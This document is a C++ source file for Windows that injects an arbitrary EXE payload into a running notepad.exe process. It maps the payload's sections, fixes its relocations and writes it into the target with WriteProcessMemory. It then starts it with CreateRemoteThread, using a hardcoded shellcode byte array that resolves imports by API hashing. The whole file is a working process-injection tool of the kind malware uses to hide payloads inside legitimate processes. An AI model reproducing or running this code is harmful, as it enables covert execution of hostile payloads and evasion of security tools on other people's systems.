#include <iostream>
#include "Injector.h"

std::string GetLastErrorAsString()
{
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0) {
		return std::string(); //No error message has been recorded
	}

	LPSTR messageBuffer = nullptr;

	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)& messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	LocalFree(messageBuffer);

	return message;
}

DWORD FindProcessID(LPWSTR processName) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	PROCESSENTRY32 currentProcessEntry;
	currentProcessEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &currentProcessEntry)) {

		do {
			if (wcsncmp(processName, currentProcessEntry.szExeFile, wcslen(processName)) == 0) {
				return currentProcessEntry.th32ProcessID;
			}

		} while (Process32Next(hSnapshot, &currentProcessEntry));

	}

	return -1;
}


int main()
{

	/*
		1. Get full path of PE file to inject.
	*/

#ifdef _DEBUG
	std::string exePath = "C:\\PEPayload.exe";
#else
	std::string exePath;
	std::cout << "Enter EXE to Inject into self: ";
	std::cin >> exePath;
#endif

	std::cout << "File selected for injection: " << exePath << "\n";

	/*
		2. Read target EXE from disk into local Heap space
	*/


	HANDLE hExePayloadFile = CreateFileA(&(exePath[0]), GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hExePayloadFile == INVALID_HANDLE_VALUE) {
		std::cout << GetLastErrorAsString();
		return -1;
	}

	DWORD exePayloadFileSize = GetFileSize(hExePayloadFile, NULL);
	if (exePayloadFileSize == INVALID_FILE_SIZE) {
		std::cout << GetLastErrorAsString();
		return -1;
	}

	PIMAGE_DOS_HEADER pExePayloadUnmapped = (PIMAGE_DOS_HEADER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, exePayloadFileSize);
	if (pExePayloadUnmapped == NULL) {
		std::cout << GetLastErrorAsString();
		return -1;
	}

	if (!ReadFile(hExePayloadFile, pExePayloadUnmapped, exePayloadFileSize, NULL, NULL)) {
		std::cout << GetLastErrorAsString();
		return -1;
	}

	CloseHandle(hExePayloadFile);

	/*
		2. Map target EXE into local heap space
	*/

	// Allocate new heap space for mapped executable

	PIMAGE_NT_HEADERS64 pExePayloadNTHeaders = (PIMAGE_NT_HEADERS64)(pExePayloadUnmapped->e_lfanew + (LPBYTE)pExePayloadUnmapped);

	PIMAGE_DOS_HEADER pExePayloadMapped = (PIMAGE_DOS_HEADER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pExePayloadNTHeaders->OptionalHeader.SizeOfImage);
	if (pExePayloadUnmapped == NULL) {
		std::cout << GetLastErrorAsString();
		return -1;
	}

	// Copy headers to mapped memory space

	DWORD totalHeaderSize = pExePayloadNTHeaders->OptionalHeader.SizeOfHeaders;
	memcpy_s(pExePayloadMapped, totalHeaderSize, pExePayloadUnmapped, totalHeaderSize);

	// Map PE sections into mapped memory space

	DWORD numberOfSections = pExePayloadNTHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pCurrentSection = (PIMAGE_SECTION_HEADER)(pExePayloadNTHeaders->FileHeader.SizeOfOptionalHeader + (LPBYTE) & (pExePayloadNTHeaders->OptionalHeader));

	for (DWORD i = 0; i < numberOfSections; i++, pCurrentSection++) {

		if (pCurrentSection->SizeOfRawData != 0) {
			LPBYTE pSourceSectionData = pCurrentSection->PointerToRawData + (LPBYTE)pExePayloadUnmapped;
			LPBYTE pDestinationSectionData = pCurrentSection->VirtualAddress + (LPBYTE)pExePayloadMapped;
			DWORD sectionSize = pCurrentSection->SizeOfRawData;

			memcpy_s(pDestinationSectionData, sectionSize, pSourceSectionData, sectionSize);
		}
	}

	// Replace our header pointer to mapped data and free the unmapped file in the heap

	pExePayloadNTHeaders = (PIMAGE_NT_HEADERS64)(pExePayloadMapped->e_lfanew + (LPBYTE)pExePayloadMapped);
	HeapFree(GetProcessHeap(), 0, pExePayloadUnmapped);

	/*
		3. Aquire Handle to Remote Process and Allocate Enough memory to copy target executable to
	*/


	// Find PID of Target Process
	LPCWSTR injectionTargetProcess = L"notepad.exe";
	DWORD injectionTargetProcessID = FindProcessID((LPWSTR)injectionTargetProcess);

	if (injectionTargetProcessID == -1) {
		wprintf(L"Could not find process: %ls", injectionTargetProcess);
		return 0;
	}

	wprintf(L"Injecting into %ls (%d)\n", injectionTargetProcess, injectionTargetProcessID);

	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, injectionTargetProcessID);
	if (hTargetProcess == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << "Failed to aquire handle to process: " << errorMessage << "\n";
		return -1;
	}

	LPVOID pRemoteMappedBuffer = VirtualAllocEx(hTargetProcess, NULL, pExePayloadNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteMappedBuffer == NULL) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << errorMessage << "\n";
		return -1;
	}

	/*
		4. Update the Base Relocation Table
	*/

	DWORD baseRelocationRVA = pExePayloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	PIMAGE_BASE_RELOCATION pCurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)(baseRelocationRVA + (LPBYTE)pExePayloadMapped);

	while (pCurrentBaseRelocation->VirtualAddress != NULL && baseRelocationRVA != 0) {

		DWORD relocationEntryCount = (pCurrentBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
		PIMAGE_RELOC pCurrentBaseRelocationEntry = (PIMAGE_RELOC)((LPBYTE)pCurrentBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));

		for (DWORD i = 0; i < relocationEntryCount; i++, pCurrentBaseRelocationEntry++) {
			if (pCurrentBaseRelocationEntry->type == IMAGE_REL_BASED_DIR64) {

				ULONGLONG* pRelocationValue = (ULONGLONG*)((LPBYTE)pExePayloadMapped + (ULONGLONG)((ULONGLONG)pCurrentBaseRelocation->VirtualAddress + pCurrentBaseRelocationEntry->offset));
				ULONGLONG updatedRelocationValue = (ULONGLONG)((*pRelocationValue - pExePayloadNTHeaders->OptionalHeader.ImageBase) + (LPBYTE)pRemoteMappedBuffer);
				*pRelocationValue = updatedRelocationValue;
			}
		}

		// Increment current base relocation entry to the next one, we do this by adding its total size to the current offset
		pCurrentBaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pCurrentBaseRelocation + pCurrentBaseRelocation->SizeOfBlock);
	}

	/*
		5. Copy Mapped Payload into Remote Process
	*/

	if (!WriteProcessMemory(hTargetProcess, pRemoteMappedBuffer, (LPVOID)pExePayloadMapped, pExePayloadNTHeaders->OptionalHeader.SizeOfImage, NULL)) {
		std::string errorMessage = GetLastErrorAsString();
		std::cout << errorMessage << "\n";
		return -1;
	}

	/*
		6.  If the payload has an IAT, copy over IAT fixing shellcode and invoke it
			If the payload does not have an IAT, invoke the EntryPoint as a new thread
	*/

	DWORD importDescriptorRVA = pExePayloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if (importDescriptorRVA != 0) {

		BYTE iatFixShellArray[] = { 0x41,0x57,0x48,0x83,0xEC,0x40,0x65,0x48,0x8B,0x04,0x25,0x60,0x00,0x00,0x00,0x4C,0x8B,0xF9,0x48,0x8B,0x50,0x18,0x4C,0x8B,0x5A,0x20,0x66,0x0F,0x1F,0x44,0x00,0x00,0x4D,0x8B,0x53,0x50,0x45,0x33,0xC0,0x66,0x45,0x39,0x02,0x74,0x10,0x49,0x8B,0xC2,0x49,0xFF,0xC0,0x48,0x8D,0x40,0x02,0x66,0x83,0x38,0x00,0x75,0xF3,0x33,0xD2,0x44,0x8D,0x4A,0x35,0x4D,0x85,0xC0,0x74,0x30,0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00,0x41,0x0F,0xB7,0x0C,0x52,0x48,0xFF,0xC2,0x41,0x69,0xC1,0x9E,0xF2,0x10,0x00,0x03,0xC8,0x81,0xE1,0xFF,0xFF,0xFF,0x00,0x44,0x03,0xC9,0x49,0x3B,0xD0,0x72,0xE1,0x41,0x81,0xF9,0x67,0x40,0x0C,0x05,0x74,0x11,0x4D,0x8B,0x1B,0x41,0x83,0x7B,0x70,0x00,0x75,0x9E,0x48,0x83,0xC4,0x40,0x41,0x5F,0xC3,0x48,0x89,0x5C,0x24,0x50,0x49,0x8B,0x5B,0x20,0x48,0x85,0xDB,0x0F,0x84,0xF1,0x01,0x00,0x00,0x48,0x63,0x43,0x3C,0x48,0x89,0x6C,0x24,0x60,0x48,0x89,0x74,0x24,0x68,0x33,0xF6,0x48,0x89,0x7C,0x24,0x38,0x8B,0x8C,0x18,0x88,0x00,0x00,0x00,0x48,0x03,0xCB,0x4C,0x89,0x64,0x24,0x30,0x4C,0x89,0x6C,0x24,0x28,0x45,0x33,0xE4,0x4C,0x89,0x74,0x24,0x20,0x45,0x33,0xF6,0x8B,0x41,0x18,0x8B,0x69,0x20,0x8B,0x79,0x24,0x48,0x03,0xEB,0x44,0x8B,0x69,0x1C,0x48,0x03,0xFB,0x4C,0x03,0xEB,0x89,0x44,0x24,0x58,0x85,0xC0,0x0F,0x84,0x7D,0x01,0x00,0x00,0x0F,0x1F,0x40,0x00,0x66,0x66,0x66,0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00,0x44,0x8B,0x55,0x00,0x33,0xD2,0x4C,0x03,0xD3,0x45,0x0F,0xB6,0x1A,0x45,0x84,0xDB,0x74,0x1A,0x49,0x8B,0xC2,0x66,0x66,0x66,0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00,0x48,0xFF,0xC2,0x48,0x8D,0x40,0x01,0x80,0x38,0x00,0x75,0xF4,0x45,0x33,0xC0,0x41,0xB9,0x35,0x00,0x00,0x00,0x48,0x85,0xD2,0x74,0x39,0x66,0x0F,0x1F,0x44,0x00,0x00,0x43,0x0F,0xBE,0x0C,0x10,0x49,0xFF,0xC0,0x41,0x69,0xC1,0x9E,0xF2,0x10,0x00,0x03,0xC8,0x81,0xE1,0xFF,0xFF,0xFF,0x00,0x44,0x03,0xC9,0x4C,0x3B,0xC2,0x72,0xE1,0x41,0x81,0xF9,0x9D,0xE0,0xA3,0x05,0x75,0x0B,0x0F,0xB7,0x07,0x41,0x8B,0x74,0x85,0x00,0x48,0x03,0xF3,0x33,0xD2,0x45,0x84,0xDB,0x74,0x12,0x49,0x8B,0xC2,0x0F,0x1F,0x00,0x48,0xFF,0xC2,0x48,0x8D,0x40,0x01,0x80,0x38,0x00,0x75,0xF4,0x45,0x33,0xC0,0x41,0xB9,0x35,0x00,0x00,0x00,0x48,0x85,0xD2,0x74,0x39,0x66,0x0F,0x1F,0x44,0x00,0x00,0x43,0x0F,0xBE,0x0C,0x10,0x49,0xFF,0xC0,0x41,0x69,0xC1,0x9E,0xF2,0x10,0x00,0x03,0xC8,0x81,0xE1,0xFF,0xFF,0xFF,0x00,0x44,0x03,0xC9,0x4C,0x3B,0xC2,0x72,0xE1,0x41,0x81,0xF9,0x41,0xF2,0x69,0x06,0x75,0x0B,0x0F,0xB7,0x07,0x45,0x8B,0x64,0x85,0x00,0x4C,0x03,0xE3,0x4D,0x85,0xE4,0x74,0x05,0x48,0x85,0xF6,0x75,0x16,0x41,0xFF,0xC6,0x48,0x83,0xC5,0x04,0x48,0x83,0xC7,0x02,0x44,0x3B,0x74,0x24,0x58,0x0F,0x82,0x0D,0xFF,0xFF,0xFF,0x4D,0x85,0xE4,0x74,0x76,0x48,0x85,0xF6,0x74,0x71,0x49,0x63,0x6F,0x3C,0x46,0x8B,0xB4,0x3D,0x90,0x00,0x00,0x00,0x49,0x83,0xC6,0x0C,0x4D,0x03,0xF7,0x41,0x8B,0x06,0x85,0xC0,0x74,0x4D,0x8B,0xC8,0x49,0x03,0xCF,0x41,0xFF,0xD4,0x41,0x8B,0x5E,0x04,0x48,0x8B,0xF8,0x49,0x03,0xDF,0x48,0x8B,0x0B,0x48,0x85,0xC9,0x74,0x27,0x79,0x05,0x0F,0xB7,0xD1,0xEB,0x07,0x49,0x8D,0x57,0x02,0x48,0x03,0xD1,0x48,0x8B,0xCF,0xFF,0xD6,0x48,0x85,0xC0,0x74,0x25,0x48,0x89,0x03,0x48,0x83,0xC3,0x08,0x48,0x8B,0x0B,0x48,0x85,0xC9,0x75,0xD9,0x41,0x8B,0x46,0x14,0x49,0x83,0xC6,0x14,0x85,0xC0,0x75,0xB3,0x42,0x8B,0x44,0x3D,0x28,0x49,0x03,0xC7,0xFF,0xD0,0x4C,0x8B,0x6C,0x24,0x28,0x4C,0x8B,0x64,0x24,0x30,0x48,0x8B,0x7C,0x24,0x38,0x48,0x8B,0x74,0x24,0x68,0x48,0x8B,0x6C,0x24,0x60,0x4C,0x8B,0x74,0x24,0x20,0x48,0x8B,0x5C,0x24,0x50,0x48,0x83,0xC4,0x40,0x41,0x5F,0xC3 };
		SIZE_T iatFixShellArrayLength = 664;


		LPVOID pIATFixShellcode = VirtualAllocEx(hTargetProcess, NULL, iatFixShellArrayLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pIATFixShellcode == NULL) {
			std::string errorMessage = GetLastErrorAsString();
			std::cout << errorMessage << "\n";
			return -1;
		}

		if (!WriteProcessMemory(hTargetProcess, pIATFixShellcode, (LPVOID)iatFixShellArray, iatFixShellArrayLength, NULL)) {
			std::string errorMessage = GetLastErrorAsString();
			std::cout << errorMessage << "\n";
			return -1;
		}

		FlushInstructionCache(hTargetProcess, pIATFixShellcode, iatFixShellArrayLength);
		FlushInstructionCache(hTargetProcess, pRemoteMappedBuffer, pExePayloadNTHeaders->OptionalHeader.SizeOfImage);


		HANDLE hRemoteThread = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pIATFixShellcode, pRemoteMappedBuffer, 0, NULL);
		if (hRemoteThread == NULL) {
			std::string errorMessage = GetLastErrorAsString();
			std::cout << errorMessage << "\n";
			return -1;
		}
	}
	else if (importDescriptorRVA == 0) {

		LPTHREAD_START_ROUTINE pEntryPoint = (LPTHREAD_START_ROUTINE)(pExePayloadNTHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)pRemoteMappedBuffer);
		
		HANDLE hRemoteThread = CreateRemoteThread(hTargetProcess, NULL, 0, pEntryPoint, NULL, NULL, NULL);
		if (hRemoteThread == NULL) {
			std::string errorMessage = GetLastErrorAsString();
			std::cout << errorMessage << "\n";
			return -1;
		}

	}

	HeapFree(GetProcessHeap(), 0, pExePayloadMapped);
	return 0;
}

